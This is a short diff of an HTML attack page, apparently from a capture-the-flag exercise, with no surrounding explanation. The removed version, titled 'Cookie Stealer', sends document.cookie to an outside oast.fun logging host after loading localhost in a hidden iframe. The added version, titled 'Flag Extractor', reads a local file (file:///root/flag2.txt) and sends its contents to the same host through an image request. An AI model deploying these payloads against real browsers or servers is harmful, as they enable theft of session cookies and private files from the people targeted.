@@ -1,16 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Stealer</title>
+    <title>Flag Extractor</title>
 </head>
 <body>
-    <iframe src="http://localhost/" style="display:none"></iframe>
     <script>
-        setTimeout(() => {
-            const img = new Image();
-            img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?cookie=" + encodeURIComponent(document.cookie);
-            document.body.appendChild(img);
-        }, 3000); // Wait 3 seconds for the iframe to load
+        const xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Send the result to your server
+                const img = new Image();
+                img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?flag=" + encodeURIComponent(xhr.responseText);
+                document.body.appendChild(img);
+            }
+        };
+        xhr.open("GET", "file:///root/flag2.txt", true);
+        xhr.send();
     </script>
 </body>
 </html>
